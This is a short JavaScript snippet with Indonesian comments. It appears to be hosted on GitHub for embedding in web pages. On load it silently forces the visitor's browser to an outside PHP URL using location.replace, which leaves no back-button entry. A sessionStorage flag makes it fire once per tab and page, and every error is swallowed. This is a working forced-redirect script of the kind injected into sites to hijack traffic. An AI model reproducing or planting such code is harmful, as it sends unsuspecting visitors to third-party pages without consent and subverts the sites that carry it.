(function () {
  try {
    // URL tujuan FIX di dalam file JS GitHub
    var target = "https://vidoy.fun/cB6Tyq0.php";

    // Buat key unik per TAB **dan per halaman/link**
    // Gabungkan target + URL halaman tempat script dipanggil
    var page = location.origin + location.pathname + location.search + location.hash;
    var key = "redir:" + target + "|" + page;

    // Kalau sudah pernah redirect di TAB ini untuk halaman tersebut, jangan ulang
    if (sessionStorage.getItem(key) === "1") return;

    // Tandai lalu redirect tanpa buka tab baru
    sessionStorage.setItem(key, "1");
    window.location.replace(target);
  } catch (_) {}
})();
